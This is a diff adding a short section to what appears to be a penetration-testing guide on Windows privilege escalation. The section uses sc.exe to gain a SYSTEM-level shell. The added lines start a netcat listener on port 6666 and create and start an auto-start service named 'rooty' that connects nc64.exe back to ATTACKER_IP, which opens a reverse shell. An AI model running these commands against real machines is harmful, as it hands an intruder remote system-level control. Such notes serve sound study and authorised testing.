@@ -90,7 +90,23 @@ nt authority\system
 
 #### 3.2 Using `sc.exe`&#x20;
 
-...
+a. Start a listener on the attacker machine:
+
+```
+$ nc -lvnp 6666
+```
+
+b. Create and start a new service&#x20;
+
+{% code overflow="wrap" %}
+```powershell
+C:\> sc.exe create "rooty" binPath= "c:\tools\nc64.exe ATTACKER_IP 6666" start= auto
+
+C:\> sc.exe start "rooty"
+```
+{% endcode %}
+
+Now, ...
 
 
 
